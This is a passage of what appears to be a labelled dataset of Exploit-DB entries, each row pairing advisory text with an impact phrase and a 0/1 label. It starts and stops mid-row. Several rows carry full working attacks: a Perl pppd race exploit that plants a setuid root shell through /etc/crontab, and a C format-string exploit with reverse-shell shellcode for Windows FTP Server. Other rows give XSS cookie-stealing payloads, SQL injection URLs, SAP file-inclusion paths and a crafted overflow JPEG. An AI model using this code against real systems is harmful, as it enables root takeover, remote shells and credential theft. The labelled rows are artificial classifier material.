v7.3.5.6379 & Virtual Appliance.   Report-Timeline: ================ 2012-05-02:	Researcher Notification & Coordination 2012-05-03:	Vendor Notification 2012-05-10:	Vendor Response/Feedback 2012-08-14:	Public or Non-Public Disclosure (90 Days passed) 2012-09-17:	Vendor Fix/Patch    Status: ======== Published   Affected Products: ================== SonicWall Product: AntiSpam & EMail Security Appliance Application v7.3.5.6379   Exploitation-Technique: ======================= Remote   Severity: ========= Medium   Details: ======== 1.1 Multiple persistent input validation vulnerabilities are detected in SonicWalls UTM Email Security v7.3.5.6379 & Virtual Appliance. The vulnerability allows an remote attacker or local low privileged user account to inject/implement malicious persistent script  code on application side of the email security appliance application. The vulnerabilities are located on the Compliance & Virus  protection procedures module when processing to load unsanitized inputs as output listing of a configuration. Vulnerable values are  floodMsgThreshold, zombieNoOfQuarantine, zombieNoOfMessageFromOneUser, safeModeNoOfQuarantine, safeModeNoOfMessageFromOneUser, zombieAllowEmailAddrs & floodMsgThresholdShadow. Successful exploitation of the vulnerability result in session hijacking,  persistent phishing requests & stable persistent module context manipulation.   Vulnerable Module(s): 				[+] Virenschutzverfahren 				[-] Ausgehend (Outgoing) - Listing & Exceptions  				[+] Compliance Module 				[-] Approval Ordner > Add new Approval Folder    1.2 Multiple client side cross site scripting vulnerabilities are detected in SonicWalls UTM Email Security v7.3.5.6379 & Virtual Appliance. The vulnerability allows an remote attacker to manipulate client side appliance requests with medium required user inter action. Successful exploitation results in sessio hijacking, account steal, client side phishing requests or manipulated context  exection on client side requests. The vulnerabilities are located on the `from`- & `row` page listing values. Successful exploitation  of the vulnerability result in client side session hijacking, non-persistent phishing requests & non-persistent module context manipulation.   Vulnerable Module(s): 				[+] Listing Page (?from & ?row)    Proof of Concept: ================= 1.1 The persistent input validation vulnerabilities can be exploited by remote attackers with low privileged user accounts.  For demonstration or reproduce ...  PoC: Ausgehend (Outgoing) - Listing & Exceptions  <input disabled=""disabled"" id=""floodMsgThreshold"" name=""floodMsgThreshold"" value=""""  type=""hidden""><iframe src=""virus_config-Dateien/a.htm"" [EXECUTE/INJECT PERSISTENT CODE!]' <""="""">     <input type=""hidden"" id=""floodInterval"" name=""floodInterval""  value=""1""/>  ... or  <input type=""text""  name=""zombieNoOfQuarantine"" size=""3""  value=""""><iframe src=a  [EXECUTE/INJECT PERSISTENT CODE!]"") <""  id=""zombieNoOfQuarantine"">   ... or  amp;lt;input type=""text""  name=""zombieNoOfMessageFromOneUser"" size=""3""  value=""""><iframe src=a  [EXECUTE/INJECT PERSISTENT CODE!]"") <""  id=""zombieNoOfMessageFromOneUser"">   ... or   <input type=""text""  name=""safeModeNoOfQuarantine"" size=""3""  value=""""><iframe src=a  [EXECUTE/INJECT PERSISTENT CODE!]"") <""  id=""safeModeNoOfQuarantine"">  ... or  <input type=""text""  name=""safeModeNoOfMessageFromOneUser"" size=""3""  value=""""><iframe src=a  [EXECUTE/INJECT PERSISTENT CODE!]"") <""  id=""safeModeNoOfMessageFromOneUser"">   URL: 	http://esserver.127.0.0.1:8080/virus_config.html     PoC: Compliance Module  -> Approval Ordner - Listing & Exceptions  <tbody><tr><td background=""policy_approval_box_summary-Dateien/nav_bar_background.gif"" width=""24""> <img src=""policy_approval_box_summary-Dateien/clear.gif"" height=""15"" width=""4""></td><td border=""0""  background=""policy_approval_box_summary-Dateien/nav_bar_background.gif""><span class=""column"">Approval- Ordner</span></td><td border=""0"" background=""policy_approval_box_summary-Dateien/nav_bar_background.gif""> <span class=""column"">Nachrichten, die eine Genehmigung erfordern</span></td><td background=""policy_approval_box_ summary-Dateien/nav_bar_background.gif""> </td></tr><tr> <td height=""12""> </td> <td><a href=""http://esserver.demo.sonicwall.com/policy_approval_box.html ?pathname=[INJECTED PERSISTENT CODE!]""><iframe src=""policy_approval_box_ summary-Dateien/a.htm"" [EXECUTION OF PERSISTENT CODE!]"" <<="""" a=""""></td> <td>0</td> <td><div  align=""right""><input type=""button"" name=""delete"" class=""button""  value=""Löschen""    URL: http://esserver.127.0.0.1:8080/policy_approval_box_summary.html    1.2 The client side cross site scripting vulnerability can be exploited by remote attackers with medium required user inter action. For demonstration or reproduce ...  PoC:  http://esserver.127.0.0.1:8080/alert_history.html?from=200<%253ciframe%2520src%3Da%2520onload%3Dalert%28document.cookie%29%2520%253c http://esserver.127.0.0.1:8080/alert_history.html[POST REQUEST]row=200<%253ciframe%2520src%3Da%2520onload%3Dalert%28document.cookie%29%2520%253c http://esserver.127.0.0.1:8080/policy_approval_box.html?pathname=%253ciframe%2520src%3Da%2520onload%3Dalert%28document.cookie%29%2520%253c   Solution: ========= The Email Security 7.3.6 patch that addresses this set of issues has now been posted and is available to all of our Email Security customers  from the download section of our customer portal (https://www.mysonicwall.com/Firmware/DownloadCenter.aspx).    Risk: ===== 1.1 The security risk of the persistent input validation vulnerabilities are estimated as high(-).  1.2 The security risk of the client side cross site scripting vulnerabilities are estimated as low(+).   Credits: ======== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@vulnerability-lab.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright © 2012 | Vulnerability Laboratory    --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",inject/implement malicious persistent script code on application side of the email security appliance application,1
30161,Atom Photoblog 1.0.1/1.0.9 - 'AtomPhotoblog.php' Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/24363/info  Atom PhotoBlog is prone to multiple input-validation vulnerabilities because it fails to adequately sanitize user-supplied input data before rendering it in a user's browser. These issues include multiple HTML-injection vulnerabilities and a cross-site scripting vulnerability.  Attackers could exploit these issues to steal cookie-based authentication credentials from legitimate users of the site; other attacks are also possible.  Versions prior to Atom PhotoBlog 1.0.9.1 are vulnerable.  http://www.example.com/atomphotoblog/atomPhotoBlog.php?do=index&tag=<ScRiPt%20%0a%0d>alert(1566213939)%3B</ScRiPt>,fails to adequately sanitize user-supplied input data before rendering it in a user's browser,0
35145,"Pligg CMS 1.1.3 - 'range' SQL Injection source: https://www.securityfocus.com/bid/45578/info  Pligg CMS is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.  Pligg CMS 1.1.3 is vulnerable; other versions may also be affected.   http://www.example.com/cloud.php?range={SQL}","compromise the application, access or modify data, or exploit vulnerabilities in the underlying database",1
27788,OrbitHYIP 2.0 - 'signup.php?referral' Cross-Site Scripting source: https://www.securityfocus.com/bid/17766/info  OrbitHYIP is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/signup.php?referral=[XSS],have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
40841,"Microsoft Internet Explorer 8 - MSHTML 'SRun­Pointer::Span­Qualifier/Run­Type' Out-Of-Bounds Read (MS15-009) <!-- Source: http://blog.skylined.nl/20161122001.html  Synopsis  A specially crafted web-page can cause Microsoft Internet Explorer 8 to attempt to read data beyond the boundaries of a memory allocation. The issue does not appear to be easily exploitable.  Known affected software, attack vectors and mitigations  Microsoft Internet Explorer 8  An attacker would need to get a target user to open a specially crafted web-page. Disabling Javascript should prevent an attacker from triggering the vulnerable code path.  Repro.html: --> <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""     ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> <html xmlns=""http://www.w3.org/1999/xhtml"">   <head>     <meta http-equiv=""X-UA-Compatible"" content=""IE=Edge"" />   <style>     position_­fixed {  position: fixed; }     position_­relative { position: relative;  }     float_­left { float: left; }     complex { float: left; width: 100%; }     complex:first-line { clear: left; }   </style>   <script>     window.onload = function boom() {       o­Element_­float_­left = document.create­Element('float_­left');       o­Element_­complex = document.create­Element('complex');       o­Element_­position_­fixed = document.create­Element('position_­fixed');       o­Element_­position_­relative = document.create­Element('position_­relative');       o­Element_­table = document.create­Element('table');       o­Element_­x = document.create­Element('x');       o­Text­Node = document.create­Text­Node('x');       document.document­Element.append­Child(o­Element_­float_­left);       o­Element_­float_­left.append­Child(o­Element_­complex);       o­Element_­float_­left.append­Child(o­Text­Node);       o­Element_­complex.append­Child(o­Element_­position_­fixed);       o­Element_­complex.append­Child(o­Element_­position_­relative);       o­Element_­complex.append­Child(o­Element_­table);       o­Element_­complex.append­Child(o­Element_­x);       set­Timeout(function() {         o­Element_­x.set­Attribute('class', 'x');         set­Timeout(function() {           alert();           document.write(0);         }, 0);       }, 0);     }   </script>   </head> </html>  <!-- Description  The issue requires rather complex manipulation of the DOM and results in reading a value immediately following an object. The lower three bits of this value are returned by the function doing the reading, resulting in a return value in the range 0-7. After exhaustively skipping over the read AV and having that function return each value, no other side effects were noticed. For that reason I assume this issue is hard if not impossible to exploit and did not investigate further. It is still possible that there may be subtle effects that I did not notice that allow exploitation in some form or other.  Time-line  June 2014: This vulnerability was found through fuzzing. October 2014: This vulnerability was submitted to ZDI. October 2014: This vulnerability was rejected by ZDI. November 2014: This vulnerability was reported to MSRC. February 2015: This vulnerability was addressed by Microsoft in MS15-009. November 2016: Details of this issue are released. -->",Microsoft Internet Explorer 8 to attempt to read data beyond the boundaries of a memory allocation,1
24370,MapInfo Discovery 1.0/1.1 - Cleartext Transmission Credential Disclosure source: https://www.securityfocus.com/bid/10927/info    Multiple remote vulnerabilities are reported in MapInfo Discovery.    The first issue is reported to be an information disclosure vulnerability. An attacker may gain access to potentially sensitive error log information that could aid an attacker in further system compromise.    The second issue is reported to be a cross-site scripting vulnerability. The application fails to properly sanitize user-supplied URI argument data. This could allow for execution of hostile HTML and script code in the web client of a user who visits a malicious link to the vulnerable site. This code execution would occur in the security context of the site hosting the vulnerable software. Exploitation could allow for theft of cookie-based authentication credentials. Other attacks are also possible.    The third issue is reported to be a plaintext password information disclosure vulnerability. An attacker with the ability to sniff network traffic could capture user and SQL database credentials.    The fourth issue is reported to be an administrative login authentication bypass vulnerability. An attacker with a regular user account on the application can gain administrative access.    MapInfo Discovery versions 1.0 and 1.1 are reported susceptible to these vulnerabilities.  http://www.example.com/midiscovery/asplib/SignIn.asp,execution of hostile HTML and script code in the web client of a user who visits a malicious link to the vulnerable site,1
21669,"FreeBSD 4.x / NetBSD 1.4.x/1.5.x/1.6 / OpenBSD 3 - pppd Arbitrary File Permission Modification Race Condition source: https://www.securityfocus.com/bid/5355/info  A vulnerability has been reported in some versions of the pppd daemon included with multiple BSD distributions.  A race condition error in the code may result in the pppd process changing the file permissions on an arbitrary system file. pppd will generally run as a privileged user.  This issue has been reported in OpenBSD versions 3.0 and 3.1. Earlier versions of OpenBSD may share this vulnerability, this has not however been confirmed.   #!/usr/bin/perl  # Local root exploit for AnyBSD. Tested on my 4.3 FBSD homebox. # # (C) 2002 Sebastian Krahmer -- stealth at segfault dot net ;-)) # # NOT for abuse but for educational purposes only. # # Exploit description: # # The BSD pppd allows users to open any file even if its root owned. # It then tries to set apropriate terminal attributes on the filedescriptor # if a connection-script is given. As if it isn't bad enough that it allows # you to open roots console for example it also has a race: If the tcgetattr() # fails it calls some cleanup routines which use chown() to restore the mode # of the terminal (at least it ASSUMES it is an terminal). It should rather use # the tty_fd to restore the mode because between open() and tcgetattr failure+chown() # we link the file to /etc/crontab which will then have the mode of the former file # (which is probably 0666 :)  # Some code snippets. # # The vulnerable open(): # ... #        /* #         * Open the serial device and set it up to be the ppp interface. #         * First we open it in non-blocking mode so we can set the #         * various termios flags appropriately.  If we aren't dialling #         * out and we want to use the modem lines, we reopen it later #         * in order to wait for the carrier detect signal from the modem. #         */ #       while ((ttyfd = open(devnam, O_NONBLOCK | O_RDWR, 0)) < 0) { #            if (errno != EINTR) #                syslog(LOG_ERR, ""Failed to open %s: %m"", devnam); #            if (!persist || errno != EINTR) #                goto fail; #       } # ... # close_tty() which is called during cleanup because tcgetattr() of # the fd will fail: # # static void # close_tty() # { #    disestablish_ppp(ttyfd); # #   /* drop dtr to hang up */ #    if (modem) { #        setdtr(ttyfd, FALSE); #        /* #         * This sleep is in case the serial port has CLOCAL set by default, #         * and consequently will reassert DTR when we close the device. #         */ #        sleep(1); #    } # #    restore_tty(ttyfd); # #    if (tty_mode != (mode_t) -1) #        chmod(devnam, tty_mode); # #    close(ttyfd); #    ttyfd = -1; # } # # The chmod() bangs. # Fix suggestion: use fchmod() instead of chmod() and do not allow # users to open root owned files.    # ok, standard init ... umask 0;  chdir(""$ENV{HOME}""); system(""cp /etc/crontab /tmp/crontab"");  # create evil .ppprc to catch right execution path in pppd open O, "">.ppprc"" or die $!; print O ""/dev/../tmp/ppp-device\n"".         ""connect /tmp/none\n"";  close O;  print ""Starting ... You can safely ignore any error messages and lay back. It can take some\n"".       ""minutes...\n\n"";  # create a boomsh to be made +s create_boomsh();   # fork off a proc which constantly creates a mode 0666 # file and a link to /etc/crontab. crontab file will ""inherit"" # the mode then if (fork() == 0) { 	play_tricks(""/tmp/ppp-device""); }   # fork off own proc which inserts command into crontab file # which is then executed as root if (fork() == 0) { 	watch_crontab(); }  my $child;  # start pppd until race succeeds! for (;;) { 	if (($child = fork()) == 0) { 		exec (""/usr/sbin/pppd"");  	} 	wait; 	last if (((stat(""/tmp/boomsh""))[2] & 04000) == 04000); }  # ok, we have a lot of interpreters running due to fork()'s # so kill them... if (fork() == 0) { 	sleep(3); 	system(""killall -9 perl""); }  # thats all folks! ;-) exec(""/tmp/boomsh"");   ###  sub create_boomsh { 	open O, "">/tmp/boomsh.c"" or die $!; 	print O ""int main() { char *a[]={\""/bin/sh\"", 0}; setuid(0); "". 	        ""system(\""cp /tmp/crontab /etc/crontab\""); execve(*a,a,0); return 1;}\n""; 	close O; 	system(""cc /tmp/boomsh.c -o /tmp/boomsh""); }  sub play_tricks { 	my $file = shift; 	for (;;) { 		unlink($file); 		open O, "">$file""; 		close O;  		# On the OpenBSD box of a friend 0.01 as fixed value 		# did the trick. on my FreeBSD box 0.1 did. 		# maybe you need to play here 		select undef, undef, undef, rand 0.3; 		unlink($file); 		symlink(""/etc/crontab"", $file); 	} }  sub watch_crontab { 	for (;;) { 		open O, "">>/etc/crontab"" or next; 		print ""Race succeeded! Waiting for cron ...\n""; 		print O ""\n* * * * * root chown root /tmp/boomsh;chmod 04755 /tmp/boomsh\n"";  		close O; 		last; 	} 	exit;	 }",the pppd process changing the file permissions on an arbitrary system file,1
23531,"HD Soft Windows FTP Server 1.5/1.6 - 'Username' Format String // source: https://www.securityfocus.com/bid/9385/info  It has been reported that Windows FTP Server may be prone to a remote format string vulnerability when processing a malicious request from a client. The vulnerability presents itself when the server receives a malicious request containing embedded format string specifiers from a remote client when supplying a username during FTP authentication. This could be exploit to crash the server but could also theoretically permit corruption/disclosure of memory contents and execution of arbitrary code.  Windows FTP Server versions 1.6 and prior are reported to be prone to this issue.  /*  date:           12 janv 2004 subject:        PoC exploit for Windows Ftp Server v1.6 vendor:         http://srv.nease.net credits:        Peter Winter-Smith for the bug discovery shellcode:      reverse shell (~ 200 bytes) notes:          universal (doesn't rely on NT version), 2nd version of this exploit greets:         rosecurity team author:         mandragore, sploiting@mandragore.solidshells.com  */  #include <stdio.h> #include <stdlib.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <arpa/inet.h> #include <unistd.h> #include <netdb.h> #include <fcntl.h> #include <unistd.h>  unsigned char sc[]={ // some padding 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, // restore patched code in MFC42.DLL so it doesn't crash yet 0xBF,0x2B,0x38,0x40,0x5F,0x66,0xB8,0x53,0x8B,0x66,0xAB,0x47,0x66,0xB8,0x40,0xB1,0x66,0xAB, // overoptimised reverse shell relying on offsets in the WinFTPServer.exe's IAT 0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xB7,0x80,0x36,0x96,0x46,0xE2,0xFA, 0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xF2,0xF1,0x19,0x90,0x96,0x96,0x28,0x1A,0x06,0xD7, 0x96,0xFE,0xA5,0xA4,0x96,0x96,0xFE,0xE1,0xE5,0xA4,0xC9,0xC2,0x69,0x83,0x06,0x06, 0xD7,0x96,0x01,0x0F,0xC4,0xC4,0xC4,0xC4,0xD4,0xC4,0xD4,0xC4,0x7E,0x9D,0x96,0x96, 0x96,0xC1,0xC5,0xD7,0xC5,0xF9,0xF5,0xFD,0xF3,0xE2,0xD7,0x96,0xC1,0x69,0x80,0x69, 0x46,0x05,0xFE,0xE9,0x96,0x96,0x97,0xFE,0x94,0x96,0x96,0x14,0x1D,0x52,0xFC,0x86, 0xC6,0xC5,0x7E,0x9E,0x96,0x96,0x96,0xF5,0xF9,0xF8,0xF8,0xF3,0xF5,0xE2,0x96,0xC1, 0x69,0x80,0x69,0x46,0xFC,0x86,0xCF,0x1D,0x6A,0xC1,0x95,0x6F,0xC1,0x65,0x3D,0x1D, 0xAA,0xB2,0x50,0x91,0xD2,0xF0,0x51,0xD1,0xBA,0x97,0x97,0x1F,0xC9,0xAE,0x1F,0xC9, 0xAA,0x1F,0xC9,0xD6,0xC6,0xC6,0xC6,0xFC,0x97,0xC6,0xC6,0x7E,0x92,0x96,0x96,0x96, 0xF5,0xFB,0xF2,0x96,0xC6,0x7E,0x99,0x96,0x96,0x96,0xD5,0xE4,0xF3,0xF7,0xE2,0xF3, 0xC6,0xE4,0xF9,0xF5,0xF3,0xE5,0xE5,0xD7,0x96,0xF2,0xF1,0x37,0xA6,0x96,0x1D,0xD6, 0x9A,0x1D,0xD6,0x8A,0x1D,0x96,0x69,0xE6,0x9E,0x69,0x80,0x69,0x46};  void usage(char *argv0) {         printf(""usage: %s -d <ip_dest> [options]\n"",argv0);         printf(""options:\n"");         printf("" -h ip_host for the reversed shell (default 127.0.0.1)\n"");         printf("" -p port for the reversed shell (default 80)\n\n"");         exit(1); }  int main(int argc, char **argv) {         struct sockaddr_in saddr;         #define port 21         int target=0, lhost=0x0100007f;         int lport=80;         int where=0x5f40382b;         int val1=0xc283, val2=0xe2ff;         int delta=0x11eeca8-0x11ee96c;         char *buff;         int s, ret, i;          printf(""[%%] winftpserv v1.6 sploit by mandragore (v2)\n"");          if (argc<2) {                 usage(argv[0]);         }          while((i = getopt(argc, argv, ""d:h:p:""))!= EOF) {                 switch (i) {                 case 'd':                         target=inet_addr(optarg);                         break;                 case 'h':                         lhost=inet_addr(optarg);                         break;                 case 'p':                         lport=atoi(optarg);                         break;                 default:                         usage(argv[0]);                         break;                 }         }          if ((target==-1) || (lhost==-1))                 usage(argv[0]);          printf(""[.] if working you'll have a shell on %s:%d .\n"",inet_ntoa(*(struct in_addr *)&lhost),lport);         printf(""[.] launching attack on %s..\n"",inet_ntoa(*(struct in_addr *)&target));          lport=lport ^ 0x9696;         lport=(lport & 0xff) << 8 | lport >>8;         memcpy(sc+17+18+0x5a,&lport,2);          lhost=lhost ^ 0x96969696;         memcpy(sc+17+18+0x53,&lhost,4);          buff=(char *)malloc(4096);         bzero(buff,4096);          memcpy(buff,&where,4);         strcat(buff,""xyzy"");         where+=3;         memcpy(buff+8,&where,4);          strncat(buff,sc,strlen(sc));          for (i=0;i<(delta-1)/4;i++) {                 strcat(buff,""%08x"");         }          sprintf(buff,""%s%%0%dx%%hn%%0%dx%%hn\r\n"",buff,val1-strlen(sc)-((delta-1)/4)*8-4*3-7,val2-val1);          saddr.sin_family = AF_INET;         saddr.sin_addr.s_addr = target;         saddr.sin_port = htons(port);          s=socket(2,1,6);          ret=connect(s,(struct sockaddr *)&saddr, sizeof(saddr));         if (ret==-1) {                 perror(""[-] connect()"");                 exit(1);         }          send(s,buff,strlen(buff),0);          recv(s,buff,1024,0);          close(s);          printf(""[+] done.\n"");          exit(0); }",crash,1
41655,"Microsoft Windows - Uniscribe Font Processing Multiple Heap Out-of-Bounds and Wild Reads (MS17-011) Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1031  Through fuzzing, we have discovered a number of different crashes in the Windows Uniscribe user-mode library, while trying to display text using a corrupted font file or calling documented Uniscribe API functions against such malformed fonts. In this bug, we address a variety of crashes manifested through invalid memory READ accesses. Some of them occur at page boundaries, while other at seemingly valid yet non-mapped addresses. The sheer amount of the crashes makes it very difficult for us to assess the root cause, severity and impact of each of them within a reasonable time-frame. Consequently, we have only performed basic deduplication based on the top-level address of the faulting instruction, and are reporting all of such crashes in this single bug tracker entry.  A summary of the crash locations is as follows:  -------------------------------------------------------------- 1	USP10!otlMultiSubstLookup::apply+0xa8 2	USP10!otlSingleSubstLookup::applyToSingleGlyph+0x98 3	USP10!otlSingleSubstLookup::apply+0xa9 4	USP10!otlMultiSubstLookup::getCoverageTable+0x2c 5	USP10!otlMark2Array::mark2Anchor+0x18 6	USP10!GetSubstGlyph+0x2e 7	USP10!BuildTableCache+0x1ca 8	USP10!otlMkMkPosLookup::apply+0x1b4 9	USP10!otlLookupTable::markFilteringSet+0x1a 10	USP10!otlSinglePosLookup::getCoverageTable+0x12 11	USP10!BuildTableCache+0x1e7 12	USP10!otlChainingLookup::getCoverageTable+0x15 13	USP10!otlReverseChainingLookup::getCoverageTable+0x15 14	USP10!otlLigCaretListTable::coverage+0x7 15	USP10!otlMultiSubstLookup::apply+0x99 16	USP10!otlTableCacheData::FindLookupList+0x9 17	USP10!ttoGetTableData+0x4b4 18	USP10!GetSubtableCoverage+0x1ab 19	USP10!otlChainingLookup::apply+0x2d 20	USP10!MergeLigRecords+0x132 21	USP10!otlLookupTable::subTable+0x23 22	USP10!GetMaxParameter+0x53 23	USP10!ApplyLookup+0xc3 24	USP10!ApplyLookupToSingleGlyph+0x6f 25	USP10!ttoGetTableData+0x19f6 26	USP10!otlExtensionLookup::extensionSubTable+0x1d 27	USP10!ttoGetTableData+0x1a77 --------------------------------------------------------------  All of the issues reproduce successfully on Windows 7. It is highly encouraged to enable PageHeap for the test program in order to get reliable repros. It is also necessary to use a custom program which displays all of the font's glyphs at various point sizes, and additionally calls some of the Uniscribe-specific API functions.  Attached is an archive with textual crash excerpts and up to 3 samples per each unique crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41655.zip",denial of service,1
33118,"Apple Safari 4.0.1 - Error Page Address Bar URI Spoofing source: https://www.securityfocus.com/bid/35829/info  Apple Safari is affected by a URI-spoofing vulnerability.  An attacker may leverage this issue by inserting arbitrary content to spoof a URI presented to an unsuspecting user. This may lead to a false sense of trust because the victim may be presented with a URI of a seemingly trusted site while interacting with the attacker's malicious site.  Safari 4.0.1 is affected; other versions may also be vulnerable.  This issue is similar to the vulnerability discussed in BID 35803 (Mozilla Firefox Error Page Address Bar URI Spoofing Vulnerability).   </script> <center> <h1>Firefox spoofing</h1> </center> <p> <a href=""javascript:spoof()"">test!</a> <p> <script> function spoof() { a = window.open(""http://www.example.coma.document.write(""<H1>FAKE PAGE<\h1>"") a.document.write(""<title>test</title>"") a.stop (); } </script> <br> Juan Pablo Lopez Yacubian",false sense of trust,0
44655,"SAP B2B / B2C CRM 2.x < 4.x - Local File Inclusion # Title: SAP B2B / B2C CRM 2.x < 4.x - Local File Inclusion # Application:SAP B2B OR B2C is CRM # Versions Affected: SAP B2B OR B2C is CRM 2.x 3.x and 4.x with Bakend R/3 (to icss_b2b) # Vendor URL: http://SAP.com # Bugs: SAP LFI in B2B OR B2C CRM # Sent:  2018-05-03 # Reported:  2018-05-03 # Date of Public Advisory: 2018-02-09 # Reference: SAP Security Note 1870255656 # Author: Richard Alviarez  # 1. VULNERABLE PACKAGES # SAP LFI in B2B OR B2C CRM v2.x to 4.x # Other versions are probably affected too, but they were not checked.  # 2. TECHNICAL DESCRIPTION # A possible attacker can take advantage of this vulnerability  # to obtain confidential information of the platform,  # as well as the possibility of writing in the logs of the # registry in order to get remote execution of commands and take control of the system.   # 3. Steps to exploit this vulnerability  A. Open https://SAP/{name}_b2b/initProductCatalog.do?forwardPath=/WEB-INF/web.xml  Other vulnerable parameters:  https://SAP/{name}_b2b/CatalogClean.do?forwardPath=/WEB-INF/web.xml https://SAP/{name}_b2b/IbaseSearchClean.do?forwardPath=/WEB-INF/web.xml https://SAP/{name}_b2b/ForwardDynamic.do?forwardPath=/WEB-INF/web.xml page on SAP server  B. Change parameter {name} for example icss_b2b or other name....  C. Change ""/WEB-INF/web.xml"" for other files or archives internal.   # 4. Collaborators # - CuriositySec # - aDoN90 # - Vis0r",information disclosure,1
35525,"GuppY 4.6.14 - 'lng' Multiple SQL Injections source: https://www.securityfocus.com/bid/47086/info  GuppY is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.  GuppY 4.6.14 is vulnerable; other versions may also be affected.   http://www.example.com/links.php?lng=fr [sql Injection] http://www.example.com/guestbk.php?lng=fr [sql Injection] http://www.example.com/articles.php?pg=43&lng=fr [ sql Injection]","compromise the application, access or modify data, or exploit vulnerabilities in the underlying database",1
16943,"Movavi VideoSuite 8.0 Slideshow - '.jpg' Local Crash (PoC) #!/usr/bin/perl  ### # Title : Movavi VideoSuite 8.0 (SlideShow.exe) Local Crash PoC # Author : KedAns-Dz # E-mail : ked-h@hotmail.com # Home : HMD/AM (30008/04300) - Algeria -(00213555248701) # Twitter page : twitter.com/kedans # platform : Windows  # Impact : Crashs and Overflows in Process # Tested on : Windows XP SP3 Français  # Target :  Movavi Video Suite 8.0 ### # >>>>>> BAC 2011 Enchallah ( Me & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all ) # ------------ # Note : This Exploit BOF is Special Greets to Member ' Overfolw3r ' From sec4ever.com # ------------ # => start Movavi_VideoSuite_8.0 >> Create Diaporama ** Create SlideShow << Add Evil Image Here # or ...\..\etc\Movavi Video Suite 8\SlideShow.exe <<  Open The Evil Image Here # ------------ #START SYSTEM /root@MSdos/ : system(""title KedAns-Dz""); system(""color 1e""); system(""cls""); print ""\n\n"";                   print ""    |===========================================================|\n""; print ""    |= [!] Name : Movavi_VideoSuite_8 (SlideShow.exe)          =|\n""; print ""    |= [!] Exploit : Local Crash PoC                           =|\n""; print ""    |= [!] Author : KedAns-Dz                                  =|\n""; print ""    |= [!] Mail: Ked-h(at)hotmail(dot)com                      =|\n""; print ""    |===========================================================|\n""; sleep(2); print ""\n"";  $PoC =  ""\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x60"".  ""\x00\x60\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x49\x49"".  ""\x2A\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43"".  ""\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\x09\x09\x08\x0A\x0C"".  ""\x14\x0D\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D"".  ""\x1A\x1C\x1C\x20\x24\x2E\x27\x20\x22\x2C\x23\x1C\x1C\x28\x37\x29"".  ""\x2C\x30\x31\x34\x34\x34\x1F\x27\x39\x3D\x38\x32\x3C\x2E\x33\x34"".  ""\x32\xFF\xDB\x00\x43\x01\x09\x09\x09\x0C\x0B\x0C\x18\x0D\x0D\x18"".  ""\x32\x21\x1C\x21\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32"".  ""\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32"".  ""\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32"".  ""\x32\x32\x32\x32\x32\x32\xFF\xC0\x00\x11\x08"".  ""\x93\xCE\x93\xCE"". #Image Size 37838x37838 (Integer Overflow)  ""\x03"".  ""\x01\x22\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\x1F\x00\x00\x01"".  ""\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01"".  